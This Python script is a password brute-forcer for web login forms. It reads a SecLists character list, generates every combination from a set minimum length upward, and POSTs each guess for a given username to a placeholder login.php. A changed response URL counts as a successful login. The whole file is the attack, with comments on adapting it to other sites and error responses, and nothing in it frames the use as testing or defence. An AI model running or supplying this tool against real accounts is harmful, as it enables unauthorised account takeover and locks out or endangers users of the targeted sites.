import requests
import itertools

charset_path = "/usr/share/seclists/Fuzzing/alphanum-case-extra.txt" #different for Kali users, adjust based on needs or simply Wget it from git into project root.
base_url = "url/login.php" #change
username = "username" # change 
min_password_length = 5 #change based on minimum length rules on per-site basis.
found_password = None

charset = open(charset_path, 'r').read().strip().split('\n')  # Splitting by newline to remove trailing whitespaces

# Generate all possible passwords with lengths from min_password_length upwards
for length in range(min_password_length, len(charset) + 1):
    password_generator = itertools.product(charset, repeat=length)
    for password_attempt in password_generator:
        password_attempt_str = ''.join(password_attempt)
        print("Trying password:", password_attempt_str)

        payload = {'username': username, 'password': password_attempt_str, 'login': 'Login'} # change based on request header structure
        response = requests.post(base_url, data=payload)

        # Check if the URL is different from the base URL
        if response.url != base_url: #This is for a site that returns 200 on a failed login, and that only has a raw HTML div as its only error message.
        # You can adjust this for return codes, return header length ETC.
            print("Success! Found password:", password_attempt_str)
            found_password = password_attempt_str
            break  # Exit inner loop if password found
    if found_password:
        break  # Exit outer loop if password found

if found_password:
    print("Final found password:", found_password)
else:
    print("Password not found.")
